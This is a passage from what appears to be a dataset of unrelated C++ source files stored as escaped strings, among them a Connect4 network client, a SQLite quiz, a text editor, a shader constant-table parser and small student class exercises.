= 0;\r\n  X last_x = 0;\r\n  size_t lower_start = 0;\r\n  size_t upper_start = 0;\r\n  \r\n  Point rectangle[4];\r\n\r\n  auto cross(const Point &O, const Point &A, const Point &B) const {\r\n    Slope OA = A - O;\r\n    Slope OB = B - O;\r\n    return OA.dx * OB.dy - OA.dy * OB.dx;\r\n  }\r\n\r\npublic:\r\n  size_t points_in_hull = 0;\r\n\r\n  explicit PLR(Y epsilon) : epsilon(epsilon), lower(), upper() {\r\n    if (epsilon < 0)\r\n      throw std::invalid_argument(\"epsilon cannot be negative\");\r\n    upper.reserve(1u << 16);\r\n    lower.reserve(1u << 16);\r\n    //std::cout<<\"this is PLR Model\"<<std::endl;\r\n  }\r\n\r\n  bool add_point(const X &x, const Y &y) {\r\n    if (points_in_hull > 0 && x <= last_x)\r\n      throw std::logic_error(\"Points must be increasing by x.\");\r\n\r\n    last_x = x;\r\n    au",
    "#include <iostream>\n#include <arpa/inet.h>\n#include <unistd.h>\n#include <cstring>\n#include <cstdlib>\n\nvoid jugar(int sock);\nvoid print_with_color(char c);\n\nint main(int argc, char const *argv[]) {\n    if (argc != 3) {\n        std::cerr << \"Uso: \" << argv[0] << \" <IP_SERVIDOR> <PUERTO>\" << std::endl;\n        return -1;\n    }\n\n    const char *server_ip = argv[1];\n    int port = std::stoi(argv[2]);\n\n    int sock = 0;\n    struct sockaddr_in serv_addr;\n\n    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {\n        std::cerr << \"Socket Error\" << std::endl;\n        return -1;\n    }\n\n    serv_addr.sin_family = AF_INET;\n    serv_addr.sin_port = htons(port);\n\n    if (inet_pton(AF_INET, server_ip, &serv_addr.sin_addr) <= 0) {\n        std::cerr << \"La direccion IP no es valida\" << std::endl;\n        return -1;\n    }\n\n    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {\n        std::cerr << \"Error de Conexion\" << std::endl;\n        return -1;\n    }\n\n    jugar(sock);\n\n    close(sock);\n    return 0;\n}\n\nvoid jugar(int sock) {\n    char buffer[1024] = {0};\n    while (true) {\n        int valread = read(sock, buffer, 1024);\n        if (valread <= 0) {\n            break;\n        }\n\n        system(\"clear\");\n        std::cout << \"Connect4:\\n\";\n        for (int i = 0; buffer[i] != '\\0'; i++) {\n            print_with_color(buffer[i]);\n            if (buffer[i] == '\\n') std::cout << std::endl;\n        }\n\n        if (strstr(buffer, \"G\") != nullptr) {\n            std::cout << \"[Has sido desconectado]\" << std::endl;\n            break;\n        }\n\n        std::cout << \"Introduzca columna (1-7): \";\n        std::string input;\n        std::cin >> input;\n\n        // Se toma el primer caracter ingresado, se verifica si es un n\u00famero y si est\u00e1 en el rango 0-6\n        bool valid_input = false;\n        if (input.length() == 1 && isdigit(input[0])) {\n            int column = input[0] - '0'; // Se convierte el caracter a entero\n            if (column >= 1 && column <= 7) { // Se verifica si est\u00e1 en el rango 1-7\n                valid_input = true;\n                column--; // Se resta 1 para que est\u00e9 en el rango 0-6\n                input[0] = '0' + column; // Se convierte el n\u00famero a caracter nuevamente\n            }\n        }\n\n        if (!valid_input) {\n            std::cout << \"Entrada inv\u00e1lida. Por favor, introduzca un n\u00famero entre 1 y 7.\" << std::endl;\n            continue;\n        }\n\n        send(sock, input.c_str(), input.length(), 0);\n    }\n}\n\nvoid print_with_color(char c) {\n    switch (c) {\n        case 'S':\n            std::cout << \"\\033[1;31mS\\033[0m \"; // Rojo para el servidor\n            break;\n        case 'C':\n            std::cout << \"\\033[1;34mC\\033[0m \"; // Azul para el cliente\n            break;\n        case '-':\n            std::cout << \"\\033[1;32m-\\033[0m \"; // Verde para las casillas vac\u00edas\n            break;\n        default:\n            std::cout << c;\n            break;\n    }\n}\n",
    "// Member functions\n#include \"ConstantsTable.h\"\nbool ConstantTable::Create(const void* data)\n{\n\tconst uint32_t* ptr = static_cast<const uint32_t*>(data);\n\twhile (*++ptr != SIO_END)\n\t{\n\t\tif ((*ptr & SI_OPCODE_MASK) == SIO_COMMENT)\n\t\t{\n\t\t\t// Check for CTAB comment\n\t\t\tuint32_t comment_size = (*ptr & SI_COMMENTSIZE_MASK) >> 16;\n\t\t\tif (*(ptr + 1) != CTAB_CONSTANT)\n\t\t\t{\n\t\t\t\tptr += comment_size;\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\t// Read header\n\t\t\tconst char* ctab = reinterpret_cast<const char*>(ptr + 2);\n\t\t\tsize_t ctab_size = (comment_size - 1) * 4;\n\n\t\t\tconst CTHeader* header = reinterpret_cast<const CTHeader*>(ctab);\n\t\t\tif (ctab_size < sizeof(*header) || header->Size != sizeof(*header))\n\t\t\t\treturn false;\n\t\t\tm_creator = ctab + header->Creator;\n\n\t\t\t// Read constants\n\t\t\tm_constants.reserve(header->Constants);\n\t\t\tconst CTInfo* info = reinterpret_cast<const CTInfo*>(ctab + header->ConstantInfo);\n\t\t\tfor (uint32_t i = 0; i < header->Constants; ++i)\n\t\t\t{\n\t\t\t\tconst CTType* type = reinterpret_cast<const CTType*>(ctab + info[i].TypeInfo);\n\n\t\t\t\t// Fill struct\n\t\t\t\tConstantDesc desc;\n\t\t\t\tdesc.Name = ctab + info[i].Name;\n\t\t\t\tdesc.RegisterSet = static_cast<EREGISTER_SET>(info[i].RegisterSet);\n\t\t\t\tdesc.RegisterIndex = info[i].RegisterIndex;\n\t\t\t\tdesc.RegisterCount = info[i].RegisterCount;\n\t\t\t\tdesc.Rows = type->Rows;\n\t\t\t\tdesc.Columns = type->Columns;\n\t\t\t\tdesc.Elements = type->Elements;\n\t\t\t\tdesc.StructMembers = type->StructMembers;\n\t\t\t\tdesc.Bytes = 4 * desc.Elements * desc.Rows * desc.Columns;\n\t\t\t\tm_constants.push_back(desc);\n\t\t\t}\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\n\nconst ConstantDesc* ConstantTable::GetConstantByName(const std::string& name) const\n{\n\tstd::vector<ConstantDesc>::const_iterator it;\n\tfor (it = m_constants.begin(); it != m_constants.end(); ++it)\n\t{\n\t\tif (it->Name == name)\n\t\t\treturn &(*it);\n\t}\n\treturn NULL;\n}\n\nstd::string ConstantTable::ToString()\n{\n\tstd::string str;\n\t//std:size_t maxSize = 0;\n\tfor (auto const& _const : m_constants) {\n\t\tstd::string const_line;\n\t\tswitch (_const.RegisterSet) {\n\t\tcase EREGISTER_SET::RS_BOOL:\n\t\t\tconst_line += \"bool\";\n\t\t\tbreak;\n\t\tcase EREGISTER_SET::RS_SAMPLER:\n\t\t\tconst_line += \"sampler\";\n\t\t\tbreak;\n\t\tcase EREGISTER_SET::RS_INT4:\n\t\t\tconst_line += \"int4\";\n\t\t\tbreak;\n\t\tcase EREGISTER_SET::RS_FLOAT4:\n\t\t\tconst_line += \"float4\";\n\t\t\tbreak;\n\t\t}\n\t\tif (_const.RegisterCount > 1) {\n\t\t\tconst_line += 'x' + std::to_string(_const.RegisterCount / 4);\n\t\t}\n\t\tconst_line += ' ' + _const.Name;\n\t\tif (_const.StructMembers > 1) {\n\t\t\tconst_line += '[' + std::to_string(_const.StructMembers) + ']';\n\t\t}\n\t\tstd::size_t lineSize = const_line.size();\n\t\tif (lineSize >= 69)\n\t\t\tconst_line += \"      \";\n\t\telse\n\t\t{\n\t\t\tsize_t i = lineSize;\n\t\t\twhile (i < 69) {\n\t\t\t\tconst_line += ' ';\n\t\t\t\ti++;\n\t\t\t}\n\t\t}\n\t\tstd::string reg;\n\t\tswitch (_const.RegisterSet) {\n\t\tcase EREGISTER_SET::RS_BOOL:\n\t\t\treg += 'b' + std::to_string(_const.RegisterIndex);\n\t\t\tbreak;\n\t\tcase EREGISTER_SET::RS_SAMPLER:\n\t\t\treg += 's' + std::to_string(_const.RegisterIndex);\n\t\t\tbreak;\n\t\tcase EREGISTER_SET::RS_INT4:\n\t\t\treg += 'i' + std::to_string(_const.RegisterIndex);\n\t\t\tbreak;\n\t\tcase EREGISTER_SET::RS_FLOAT4:\n\t\t\treg += 'c' + std::to_string(_const.RegisterIndex);\n\t\t\tbreak;\n\t\t}\n\t\tstd::size_t regIndexSize = reg.size();\n\t\tstd::string regCount = std::to_string(_const.RegisterCount);\n\t\tstd::size_t regCountSize = regCount.size();\n\t\tstd::size_t i = regIndexSize;\n\t\twhile (i < (13 - regCountSize)) {\n\t\t\treg += ' ';\n\t\t\ti++;\n\t\t}\n\t\treg += regCount;\n\t\tconst_line += reg;\n\t\tconst_line += \"\\n\";\n\t\tstr += const_line;\n\t}\n\treturn str;\n}\n",
    "#include <algorithm>\n#include <iostream>\n#include <string>\n#include <vector>\n\nusing namespace std;\n\n// Define a struct to represent an employee\nstruct Employee {\n  string name;\n  double hourlyWage;\n  int hoursWorked;\n};\n\n// Function to calculate the total pay for an employee\ndouble calculatePay(Employee employee) {\n  return employee.hourlyWage * employee.hoursWorked;\n}\n\n// Function to display the payroll information for all employees\nvoid displayPayroll(vector<Employee> employees) {\n  cout << \"Payroll Information:\" << endl;\n  for (Employee employee : employees) {\n    cout << \"Name: \" << employee.name << endl;\n    cout << \"Hourly Wage: $\" << employee.hourlyWage << endl;\n    cout << \"Hours Worked: \" << employee.hoursWorked << endl;\n    cout << \"Total Pay: $\" << calculatePay(employee) << endl;\n    cout << endl;\n  }\n}\n\nint main() {\n  vector<Employee> employees;\n\n  // Ask the user how many employees they want to add\n  int numEmployees;\n  cout << \"Enter the number of employees: \";\n  cin >> numEmployees;\n\n  // Add employees to the payroll\n  for (int i = 0; i < numEmployees; i++) {\n    Employee employee;\n    cout << \"Enter employee \" << i + 1 << \" information:\" << endl;\n    cout << \"Name: \";\n    cin >> employee.name;\n    cout << \"Hourly Wage: $\";\n    cin >> employee.hourlyWage;\n    cout << \"Hours : \";\n    cin >> employee.hoursWorked;\n    employees.push_back(employee);\n  }\n\n  // Display the payroll information\n  displayPayroll(employees);\n\n  return 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"safety_report_guideline_service\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <vector>\r\n#include <unordered_map>\r\n\r\nusing namespace std;\r\n\r\nclass Solution {\r\npublic:\r\n    bool checkSubarraySum(vector<int>& nums, int k) {\r\n        // Create a hash map to store the remainder and the earliest index\r\n        unordered_map<int, int> remainderIndexMap;\r\n        // Initialize the map with remainder 0 at index -1\r\n        remainderIndexMap[0] = -1;\r\n        int cumulativeSum = 0;\r\n\r\n        // Iterate through the array\r\n        for (int i = 0; i < nums.size(); ++i) {\r\n            cumulativeSum += nums[i];\r\n            int remainder = (k == 0) ? cumulativeSum : cumulativeSum % k;\r\n\r\n            // Adjust negative remainder to be within the range [0, k-1]\r\n            if (remainder < 0) remainder += k;\r\n\r\n            // Check if this remainder has been seen before\r\n            if (remainderIndexMap.find(remainder) != remainderIndexMap.end()) {\r\n                // Ensure the subarray length is at least 2\r\n                if (i - remainderIndexMap[remainder] > 1) {\r\n                    return true;\r\n                }\r\n            } else {\r\n                // Store the index of the first occurrence of this remainder\r\n                remainderIndexMap[remainder] = i;\r\n            }\r\n        }\r\n\r\n        // If no valid subarray is found, return false\r\n        return false;\r\n    }\r\n};\r\n",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <sqlite3.h>\n#include <readline/readline.h>\n#include <readline/history.h>\n#include <vector>\n\nclass quiz {\npublic:\n    std::string question;\n    std::string answer;\n};\n\nstd::vector<quiz> questions;\n\nstatic int callback(void *NotUsed, int argc, char **argv, char **azColName) {\n    quiz q;\n\n    for (int i = 0; i < argc; i++) {\n        if (azColName[i] == \"question\") {\n            q.question = argv[i] ? argv[i] : \"NULL\";\n        } else if (azColName[i] == \"answer\") {\n            q.answer = argv[i] ? argv[i] : \"NULL\";\n        }\n    }\n\n    questions.push_back(q);\n    return 0;\n}\n\nint request(sqlite3 *db, std::string sql, char *zErrMsg) {\n    const char *cstr = sql.c_str();\n    int rc = sqlite3_exec(db, cstr, callback, 0, &zErrMsg);\n   \n    if( rc != SQLITE_OK ){\n        std::cerr << \"SQL error: \" << zErrMsg << \".\" << std::endl;\n        sqlite3_free(zErrMsg);\n        return 0;\n    } else {\n        return SQLITE_OK;\n    }\n\n    return 0;\n}\n\nint main(int argc, char* argv[]) {\n    if (argc != 2) {\n        std::cerr << \"Usage: \" << argv[0] << \" <sqlite_db>\" << std::endl;\n        return 0;\n    }\n\n    const char* filename_db = argv[1];\n    sqlite3* db = nullptr;\n    char* zErrMsg;\n\n    int rc = sqlite3_open(filename_db, &db);\n    if (rc) {\n        std::cerr << \"Can't open database: \" << sqlite3_errmsg(db) << std::endl;\n        return rc;\n    }\n\n    request(db, \"select * from quiz;\", zErrMsg);\n\n    for (quiz item : questions) {\n        std::string question = item.question;\n        std::string true_answer = item.answer;\n\n        std::cout << \"Question:\" << std::endl;\n        std::cout << question << std::endl;\n        std::cout << std::endl;\n\n        std::string answer;\n        std::cout << \"Enter your answer: \";\n        std::cin >> answer;\n\n        if (answer == true_answer){\n            std::cout << \"You are right.\" << std::endl;\n        }\n\n        std::cout << std::endl;\n    }\n\n    sqlite3_close(db);\n    return 0;\n}\n",
    "#include <iostream>\n#include <cstdio>\n#include <cstdlib>\n#include <cstring>\n#include <limits>\n#include <tuple>\n#include <stack>\nusing namespace std;\n\nstruct CharPointer {\n    int p;\n    char ch;\n};\n\nclass Cursor {\nprivate:\n    int* size;\n    static int cursor_position;\npublic:\n    Cursor(int* size) : size(size) { }\n\n    int move_right() {\n        if (cursor_position < *size) {\n            cursor_position++;\n        }\n        return cursor_position;\n    }\n\n    int move_left() {\n        if (cursor_position > 0) {\n            cursor_position--;\n        }\n        return cursor_position;\n    }\n\n    int get_position() {\n        return cursor_position;\n    }\n\n    void set_cursor_position(tuple<int, int> position, CharPointer* dynamic_array) {\n        int line = 0;\n        int column = 0;\n\n        for (int i = 0; i < *size; i++) {\n\n            if (dynamic_array[i].ch == '\\n') {\n                line++;\n            }\n\n            column++;\n\n            if (line == get<0>(position)) {\n                int sub_column = 0;\n                while (sub_column != get<1>(position)) {\n                    sub_column++;\n                    column++;\n                }\n\n                if (sub_column == get<1>(position)) {\n                    if (get<0>(position) == 0) {\n                        cursor_position = column-1;\n                    }\n                    else\n                    {\n                        cursor_position = column;   \n                    }\n                    break;\n                }\n                else\n                {\n                    cout << \"There is no such column in line\\n\";\n                    break;\n                }\n\n            }\n        }\n        if (line != get<0>(position)) {\n            cout << \"There is no such position in text\\n\";\n        }\n    }\n\n};\n\n\nint Cursor::cursor_position = -1;\n\nclass MyTextEditor {\nprivate:\n    CharPointer* dynamicArray;\n    size_t capacity;\n    int length;\n    stack<CharPointer*> undoStack;\n    stack<CharPointer*> redoStack;\n\npublic:\n    MyTextEditor() : capacity(64), length(0) {\n        dynamicArray = (CharPointer*)calloc(capacity, sizeof(CharPointer));\n        if (!dynamicArray) {\n            perror(\"Failed to allocate\");\n            exit(EXIT_FAILURE);\n        }\n    }\n\n    void clear_stack(stack<CharPointer*>& stackToClear) {\n        while (!stackToClear.empty()) {\n            free(stackToClear.top());\n            stackToClear.pop();\n        }\n    }\n\n    ~MyTextEditor() {\n        free(dynamicArray);\n        \n        clear_stack(undoStack);\n        clear_stack(redoStack);\n    }\n\n    void save_comand(stack<CharPointer*>& stack_to_save) {\n        CharPointer* comand = (CharPointer*)calloc(capacity, sizeof(CharPointer));\n        if (!comand) {\n            perror(\"Failed to allocate\");\n            exit(EXIT_FAILURE);\n        }\n        memcpy(comand, dynamicArray, capacity * sizeof(CharPointer));\n        stack_to_save.push(comand);\n    }\n\n    void restore_comand(stack<CharPointer*>& stack_to_restore) {\n        if (!stack_to_restore.empty()) {\n            free(dynamicArray);\n            dynamicArray = stack_to_restore.top();\n            stack_to_restore.pop();\n        }\n    }\n\n    void print(int cursor_position = -1) const {\n        for (int i = 0; i < length; i++) {\n            if (cursor_position == i) {\n                cout << \"|\";\n            }\n            cout << dynamicArray[i].ch;\n        }\n        if (cursor_position == length) {\n            cout << \"|\";\n        }\n        cout << std::endl;\n    }\n\n    void to_realloc()\n    {\n        capacity *= 2;\n        \n        CharPointer* tempArray = (CharPointer*)realloc(dynamicArray, capacity * sizeof(CharPointer));\n        if (!tempArray) {\n            perror(\"Failed to reallocate\");\n            free(dynamicArray);\n            exit(EXIT_FAILURE);\n        }  \n        dynamicArray = tempArray;\n    }\n\n    void appendText(bool ifItNewLine, int start_position = -1) {\n        save_comand(undoStack);\n        save_comand(redoStack);\n        int ch;\n        static int index = 0;\n\n        if (start_position != -1) {\n            int ch;\n            cout << \"Enter text to insert:\\n\";\n            while (!ifItNewLine && (ch = getchar()) != '\\n') {\n                dynamicArray[start_position++].ch = ch;\n                Cursor cursor(&length);\n                cursor.move_right();\n            }\n            return;\n        }\n\n        while (true) {\n            if (ifItNewLine) {\n                ch = '\\n';\n            }\n            else {\n                ch = getchar();\n            }\n\n            if (!ifItNewLine && ch == '\\n') {\n                break;\n            }\n\n            if (index < static_cast<int>(capacity) - 1) {\n                dynamicArray[index].ch = ch;\n                index++;\n                dynamicArray[index].p = dynamicArray[index - 1].p + 1;\n            }\n            else {\n                to_realloc();\n                dynamicArray[index].ch = ch;\n                index++;\n                dynamicArray[index].p = d",
    "#include \"Skirt.h\"\n#include <iostream>\n#include <string>\n#include <stdexcept>\n#include <vector>\n#include <cctype>\n#include <cstring>\n#include <variant>\n#include <memory>\n#include <algorithm>\n\nSkirt::Skirt(const std::string& garmentCode, const std::string& garmentColor): Garment(garmentCode, garmentColor) {}\n//interface implementing\nvoid Skirt::describe() const \n{\n    std::cout << \"Skirt: \" << garmentCode << \", color: \" << garmentColor << std::endl;\n}\nvoid Skirt::describeSkirt() const\n{\n    std::cout << \"A skirt: \" << garmentCode << \" \" << garmentColor << std::endl;\n}\nvoid Skirt::addedGarment() const \n{\n    std::cout << \"Skirt added successfully!\" << std::endl;\n}\nvoid Skirt::removedGarment() const \n{\n    std::cout << \"Skirt removed successfully!\" << std::endl;\n}\nvoid Skirt::setSkirt(const std::string& skirtName, const std::string& colorName) //setter\n{\n    garmentCode = skirtName;\n    garmentColor = colorName;\n}\nstd::unique_ptr<Garment> Skirt::clone() const \n{\n    return std::make_unique<Skirt>(*this);\n}\nSkirt& Skirt::operator=(const Skirt& other) //operator=\n{\n    if (this != &other)\n    {\n        garmentCode = other.garmentCode;\n        garmentColor = other.garmentColor;\n    }\n    return *this;\n}\nSkirt::Skirt(const Skirt& other): Garment(other) {} //constructor de copiere\nstd::ostream& operator<<(std::ostream& os, const Skirt& s) //operator<<\n{\n    os << \"Skirt: \" << s.garmentCode << \", color: \" << s.garmentColor;\n    return os;\n}\nstd::istream& operator>>(std::istream& is, Skirt& s) //operator>>\n{\n    std::cout << \"Skirt_code: \";\n    is >> s.garmentCode;\n    std::cout << \"color: \";\n    is >> s.garmentColor;\n    return is;\n}\nSkirt::Skirt(Skirt&& other) noexcept: Garment(std::move(other)) //move constructor\n{\n    other.garmentCode.clear();\n    other.garmentColor.clear();\n}\nSkirt& Skirt::operator=(Skirt&& other) noexcept //move assignment operator for Skirt\n{\n    if (this != &other)\n    {\n        garmentCode = std::move(other.garmentCode);\n        garmentColor = std::move(other.garmentColor);\n        other.garmentCode.clear();\n        other.garmentColor.clear();\n    }\n    return *this;\n}",
    "\n//Maaz ALi\n//22i-1042\n//Assignment4\n\n#include \"Books.h\"\n\nBooks::Books()\n{\n}\nBooks ::Books(int id1, string na1, string ad1, int num1, string date1, bool flag, string ty)\n{\n    id = id1;\n    name = na1;\n    author = ad1;\n    number = num1;\n    purchased_date = date1;\n    avail = flag;\n    type = ty;\n}\nvoid Books::setID(int x)\n{\n    id = x;\n}\nvoid Books::setNumber(int x)\n{\n    number = x;\n}\nvoid Books::setName(string n)\n{\n    name = n;\n}\nvoid Books::setAuthor(string a)\n{\n    author = a;\n}\nvoid Books::setDate(string date)\n{\n    purchased_date = date;\n}\nvoid Books::setType(string n)\n{\n    type = n;\n}\nvoid Books::setAvailable(bool flag)\n{\n    avail = flag;\n}\nint Books::getId()\n{\n    return id;\n}\nint Books::getnumber()\n{\n    return number;\n}\nstring Books::getName()\n{\n    return name;\n}\nstring Books::getType()\n{\n    return type;\n}\nstring Books::getAuthor()\n{\n    return author;\n}\nstring Books::getDate()\n{\n    return purchased_date;\n}\nbool Books::getAvailable()\n{\n    return avail;\n}\nBooks Books::operator=(Books b)\n{\n    if(b.id!=-1)\n    {\n    id = b.id;\n    name = b.name;\n    author = b.author;\n    number = b.number;\n    purchased_date = b.purchased_date;\n    avail = b.avail;\n    type = b.type;\n    dayiss=b.dayiss;\n    dayre=b.dayre;\n    moiss=b.moiss;\n    more=b.more;\n    return *this;\n    }\n    else\n    {\n        id=-1;\n        name=\"\";\n        author=\"\";\n        number=-1;\n        purchased_date=\"\";\n        avail=false;\n        type=\"\";\n        return *this;\n    }\n}\nvoid Books::BookDisplay()\n{\n    cout << \"\\nType          :\" << type;\n    cout << \"\\nName          :\" << name;\n    cout << \"\\nAuthor        :\" << author;\n    cout << \"\\nID            :\" << id;\n    cout << \"\\nEdition Number:\" << number;\n    cout << \"\\nPurchased Date:\" << purchased_date;\n    cout << \"\\nAvailable     :\" << avail;\n    cout << \"\\nIssue date    :\"<<dayiss<<\" - \"<<moiss;\n    cout << \"\\nReturn date   :\"<<dayre<<\"  - \"<<more;\n\n}\nvoid Books::set_dateissued(int da,int mo)\n{\n    dayiss=da;\n    moiss=mo;\n}\nvoid Books::set_dateret(int da,int mo)\n{\n    dayre=da;\n    more=mo;\n}\nint  Books::getdayissu()\n{\n    return dayiss;\n}\nint  Books::getmonthissu()\n{\n    return moiss;\n}\n\nint Books::getdayretu()\n{\n    return dayre;\n}\nint Books::getmoretu()\n{\n    return more;\n}\nBooks::~Books()\n{\n\n}",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <iomanip>\r\n#include <windows.h> // For system(\"cls\")\r\n\r\nusing namespace std;\r\n\r\nclass Structure {\r\nprotected:\r\n    string name;\r\n    string address;\r\n    string phone;\r\n    string email;\r\n    string age;\r\n    string salary;\r\n    string occupation;\r\n    string grade;\r\n    string car;\r\n    bool chkCar;\r\n\r\npublic:\r\n   \r\n};\r\n\r\nclass Car : public Structure {\r\nprivate:\r\n    string brand;\r\n    string model;\r\n    string color;\r\n    string registration;\r\n    int quantity;\r\n    string engine;\r\n    int year;\r\n    string company;\r\n\r\npublic:\r\n    \r\n\r\n    void addCar() {\r\n    \t\r\n        ofstream file(\"car_info.txt\", ios::out |ios::app);\r\n        \r\n\t\tif (file.is_open()) {\r\n        \r\n\t\t    file << brand << \",\" << model << \",\" << color << \",\" << registration << \",\" << quantity << \",\" << engine << \",\" << year << \",\" << company << endl;\r\n        \r\n\t\t    file.close();\r\n        \r\n\t\t    cout << \"\\n******** Car data added successfully! ********\\n\" << endl;\r\n        \r\n\t\t} else {\r\n        \r\n\t\t    cout << \"\\n******** Unable to open file ********\\n\" << endl;\r\n        \r\n\t\t}\r\n    }\r\n\r\n    void displayCars() {\r\n        \r\n\t\tifstream file(\"car_info.txt\");\r\n        \r\n\t\tif (file.is_open()) {\r\n        \r\n\t\t    string line;\r\n        \r\n\t\t    cout << \"\\n================= Car Information =================\" << endl;\r\n        \r\n\t\t    cout << setw(10) << \"Brand\" << setw(10) << \"Model\" << setw(10) << \"Color\" << setw(15) << \"Registration\" << setw(10) << \"Quantity\" << setw(10) << \"Engine\" << setw(5) << \"Year\" << setw(10) << \"Company\" << endl;\r\n        \r\n\t\t    cout << \"==================================================\" << endl;\r\n        \r\n\t\t    while (getline(file, line)) {\r\n                cout << line << endl;\r\n            }\r\n        \r\n\t\t    file.close();\r\n        } else {\r\n        \r\n\t\t    cout << \"\\n******** Unable to open file ********\\n\" << endl;\r\n        \r\n\t\t}\r\n    }\r\n\r\n    void updateCar() {\r\n        \r\n\t\tifstream file(\"car_info.txt\");\r\n        \r\n\t\tofstream temp(\"temp.txt\");\r\n        \r\n\t\tstring line, modelToUpdate, newColor;\r\n\r\n        if (file.is_open()) {\r\n        \r\n\t\t    cout << \"Enter the model of the car to update: \";\r\n        \r\n\t\t    getline(cin, modelToUpdate);\r\n\r\n            while (getline(file, line)) {\r\n        \r\n\t\t        if (line.find(modelToUpdate) != string::npos) {\r\n                    cout << \"Enter new color: \";\r\n        \r\n\t\t            getline(cin, newColor);\r\n        \r\n\t\t            temp << line.substr(0, line.find_last_of(',')) << \",\" << newColor << endl;\r\n                } else {\r\n                    temp << line << endl;\r\n                }\r\n            }\r\n            file.close();\r\n            temp.close();\r\n            remove(\"car_info.txt\");\r\n        \r\n\t\t    rename(\"temp.txt\", \"car_info.txt\");\r\n        \r\n\t\t    cout << \"\\n******** Car data updated successfully! ********\\n\" << endl;\r\n        }\r\n\t\t else {\r\n            \r\n\t\t\tcout << \"\\n******** Unable to open file ********\\n\" << endl;\r\n        \r\n\t\t}\r\n    }\r\n\r\n    void deleteCar() {\r\n        ifstream file(\"car_info.txt\");\r\n        ofstream temp(\"temp.txt\");\r\n        string line, modelToDelete;\r\n\r\n        if (file.is_open()) {\r\n        \r\n\t\t    cout << \"Enter the model of the car to delete: \";\r\n        \r\n\t\t    getline(cin, modelToDelete);\r\n\r\n            while (getline(file, line)) {\r\n        \r\n\t\t        if (line.find(modelToDelete) == string::npos) {\r\n        \r\n\t\t            temp << line << endl;\r\n                }\r\n            }\r\n            file.close();\r\n            temp.close();\r\n        \r\n\t\t    remove(\"car_info.txt\");\r\n        \r\n\t\t    rename(\"temp.txt\", \"car_info.txt\");\r\n        \r\n\t\t    cout << \"\\n******** Car data deleted successfully! ********\\n\" << endl;\r\n        }\r\n\t\t else {\r\n        \r\n\t\t    cout << \"\\n******** Unable to open file ********\\n\" << endl;\r\n        \r\n\t\t}\r\n    }\r\n\r\n    void searchCarByModel(const string& query) {\r\n        \r\n\t\tifstream file(\"car_info.txt\");\r\n        \r\n\t\tif (file.is_open()) {\r\n        \r\n\t\t    string line;\r\n        \r\n\t\t    bool found = false;\r\n        \r\n\t\t    while (getline(file, line)) {\r\n        \r\n\t\t        if (line.find(query) != string::npos) {\r\n        \r\n\t\t            cout << line << endl;\r\n        \r\n\t\t            found = true;\r\n                }\r\n            }\r\n        \r\n\t\t    if (!found) {\r\n                cout << \"\\n******** Car not found ********\\n\" << endl;\r\n            }\r\n        \r\n\t\t    file.close();\r\n        } else {\r\n        \r\n\t\t    cout << \"\\n******** Unable to open file ********\\n\" << endl;\r\n        }\r\n    }\r\n    \r\n     bool isCarAvailable( string carModel) {\r\n        \r\n\t\tifstream file(\"car_info.txt\");\r\n        \r\n\t\tif (file.is_open()) {\r\n        \r\n\t\t    string line;\r\n        \r\n\t\t    while (getline(file, line)) {\r\n        \r\n\t\t        if (line.find(carModel) != string::npos) {\r\n        \r\n\t\t            file.close();\r\n        \r\n\t\t            return true; // Car found\r\n                }\r\n            }\r\n            file.close();\r\n        }\r\n        \r\n\t\treturn false; // ",
    "#include <iostream>\n#include <string>\n#include <cstring>\n#include <cctype>\n#include <sstream>\n#include <vector>\n#include <algorithm>\n#include <map>\n#include <cmath>\n#include <fstream>\n#include <iomanip>\n\nstatic std::string srcDir;\nstatic size_t eventIDLow, eventIDHigh;\nstatic double xRangeLow, xRangeHigh, xBinW;\nstatic double yRangeLow, yRangeHigh, yBinW;\n\n//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\nint getSDSize(size_t &xsize, size_t &ysize)\n//function that determines size of entropy density file\n{\n\tstd::string pathIn = srcDir + std::to_string(eventIDLow) + \".dat\";\n\tstd::ifstream fileIn(pathIn, std::ios_base::in);\n\tif (!fileIn.is_open()) {\n\t\tstd::cerr << \"Error: unable to open entropy density file when determining grid sizes. Aborting...\" << std::endl;\n\t\treturn -1;\n\t}\n\n\txsize = 0; std::vector<size_t> ysizes;\n\n\tstd::string line; double buff;\n\twhile (std::getline(fileIn, line)) {\n\t\tstd::stringstream ss(line);\n\t\tysize = 0; while (!ss.eof()) {ss >> buff; ++ysize;}\n\t\tysizes.push_back(ysize);\n\t\t++xsize;\n\t}\n\n\tstd::sort(ysizes.begin(), ysizes.end()); ysizes.erase(unique(ysizes.begin(), ysizes.end()), ysizes.end());\n\tif (ysizes.size() != 1) {\n\t\tstd::cerr << \"Error: not all entropy density sizes are the same. Aborting...\" << std::endl;\n\t\treturn -2;\n\t}\n\n\tysize = ysizes[0];\n\n\tfileIn.close();\n\n\treturn 1;\n}\n\nint addSD(std::vector<std::vector<double>> &sd, size_t event_id)\n//function that adds entropy density\n{\n\tstd::string pathIn = srcDir + 